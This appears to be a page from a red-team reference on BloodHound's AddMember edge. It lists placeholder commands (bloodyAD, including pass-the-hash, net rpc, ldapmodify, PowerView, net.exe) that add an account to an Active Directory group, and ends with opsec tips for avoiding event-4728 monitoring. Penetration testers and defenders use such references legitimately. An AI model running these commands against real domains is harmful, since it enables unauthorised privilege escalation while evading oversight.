{"title": "AddMember", "source": "bloodhound", "source_label": "BloodHound", "path": "edges/AddMember", "html": "<h1 id=\"addmember\">AddMember</h1>\n<blockquote>\n<p>Source can add any principal to the target group</p>\n</blockquote>\n<p><strong>Applies to</strong>: User/Group/Computer → Group</p>\n<hr>\n<h2 id=\"linux-abuse\">Linux Abuse</h2>\n<h3 id=\"bloodyad-add-user-to-group\">bloodyAD — add user to group</h3>\n<div class=\"highlight\"><pre><span></span><code>bloodyad<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;password&gt;&#39;</span><span class=\"w\"> </span>-d<span class=\"w\"> </span>&lt;domain&gt;<span class=\"w\"> </span>--host<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">    </span>add<span class=\"w\"> </span>groupMember<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;target-group&gt;&#39;</span><span class=\"w\"> </span><span class=\"s1\">&#39;&lt;username&gt;&#39;</span>\n</code></pre></div>\n<h3 id=\"bloodyad-add-with-hash\">bloodyAD — add with hash</h3>\n<div class=\"highlight\"><pre><span></span><code>bloodyad<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>--hashes<span class=\"w\"> </span>:&lt;ntlm-hash&gt;<span class=\"w\"> </span>-d<span class=\"w\"> </span>&lt;domain&gt;<span class=\"w\"> </span>--host<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">    </span>add<span class=\"w\"> </span>groupMember<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;target-group&gt;&#39;</span><span class=\"w\"> </span><span class=\"s1\">&#39;&lt;username&gt;&#39;</span>\n</code></pre></div>\n<h3 id=\"bloodyad-add-arbitrary-user-to-group\">bloodyAD — add arbitrary user to group</h3>\n<div class=\"highlight\"><pre><span></span><code>bloodyad<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;password&gt;&#39;</span><span class=\"w\"> </span>-d<span class=\"w\"> </span>&lt;domain&gt;<span class=\"w\"> </span>--host<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span><span class=\"se\">\\</span>\n<span class=\"w\">    </span>add<span class=\"w\"> </span>groupMember<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;target-group&gt;&#39;</span><span class=\"w\"> </span><span class=\"s1\">&#39;&lt;target-user&gt;&#39;</span>\n</code></pre></div>\n<h3 id=\"net-rpc-impacket\">net rpc (impacket)</h3>\n<div class=\"highlight\"><pre><span></span><code>net<span class=\"w\"> </span>rpc<span class=\"w\"> </span>group<span class=\"w\"> </span>addmem<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;target-group&gt;&#39;</span><span class=\"w\"> </span><span class=\"s1\">&#39;&lt;username&gt;&#39;</span><span class=\"w\"> </span>-U<span class=\"w\"> </span>&lt;domain&gt;/&lt;username&gt;%<span class=\"s1\">&#39;&lt;password&gt;&#39;</span><span class=\"w\"> </span>-S<span class=\"w\"> </span>&lt;dc-ip&gt;\n</code></pre></div>\n<h3 id=\"ldapmodify\">ldapmodify</h3>\n<div class=\"highlight\"><pre><span></span><code>ldapmodify<span class=\"w\"> </span>-H<span class=\"w\"> </span>ldap://&lt;dc-ip&gt;<span class=\"w\"> </span>-D<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;username&gt;@&lt;domain&gt;&#39;</span><span class=\"w\"> </span>-w<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;password&gt;&#39;</span><span class=\"w\"> </span><span class=\"s\">&lt;&lt;EOF</span>\n<span class=\"s\">dn: CN=&lt;target-group&gt;,CN=Users,DC=&lt;domain&gt;,DC=&lt;tld&gt;</span>\n<span class=\"s\">changetype: modify</span>\n<span class=\"s\">add: member</span>\n<span class=\"s\">member: CN=&lt;username&gt;,CN=Users,DC=&lt;domain&gt;,DC=&lt;tld&gt;</span>\n<span class=\"s\">EOF</span>\n</code></pre></div>\n<hr>\n<h2 id=\"windows-abuse\">Windows Abuse</h2>\n<h3 id=\"powerview\">PowerView</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Add-DomainGroupMember</span> <span class=\"n\">-Identity</span> <span class=\"s1\">&#39;&lt;target-group&gt;&#39;</span> <span class=\"n\">-Members</span> <span class=\"s1\">&#39;&lt;username&gt;&#39;</span> <span class=\"n\">-Credential</span> <span class=\"nv\">$cred</span>\n</code></pre></div>\n<h3 id=\"verify-membership\">Verify membership</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainGroupMember</span> <span class=\"n\">-Identity</span> <span class=\"s1\">&#39;&lt;target-group&gt;&#39;</span> <span class=\"n\">-Recurse</span> <span class=\"p\">|</span> <span class=\"nb\">Where-Object</span> <span class=\"p\">{</span><span class=\"nv\">$_</span><span class=\"p\">.</span><span class=\"n\">MemberName</span> <span class=\"o\">-eq</span> <span class=\"s1\">&#39;&lt;username&gt;&#39;</span><span class=\"p\">}</span>\n</code></pre></div>\n<h3 id=\"cmd-netexe\">CMD / net.exe</h3>\n<div class=\"highlight\"><pre><span></span><code>net group &quot;&lt;target-group&gt;&quot; &lt;username&gt; /add /domain\n</code></pre></div>\n<h3 id=\"ad-module\">AD Module</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Add-ADGroupMember</span> <span class=\"n\">-Identity</span> <span class=\"s1\">&#39;&lt;target-group&gt;&#39;</span> <span class=\"n\">-Members</span> <span class=\"s1\">&#39;&lt;username&gt;&#39;</span>\n</code></pre></div>\n<h3 id=\"cleanup\">Cleanup</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Remove-DomainGroupMember</span> <span class=\"n\">-Identity</span> <span class=\"s1\">&#39;&lt;target-group&gt;&#39;</span> <span class=\"n\">-Members</span> <span class=\"s1\">&#39;&lt;username&gt;&#39;</span> <span class=\"n\">-Credential</span> <span class=\"nv\">$cred</span>\n</code></pre></div>\n<hr>\n<h2 id=\"opsec\">Opsec</h2>\n<ul>\n<li>Group membership changes generate event 4728 (security group member added) on the DC — monitored on privileged groups (Domain Admins, etc.)</li>\n<li>Prefer adding a less-visible user or computer account; if adding self, move fast and remove after use</li>\n</ul>", "excerpt": "AddMember Source can add any principal to the target group Applies to : User/Group/Computer → Group Linux Abuse bloodyAD — add user to group bloodyad -u &lt;username&gt; -p &#39;&lt;password&gt;&#39; -d &lt;domain&gt; --host &lt;dc-ip&gt; \\ add…", "tags": []}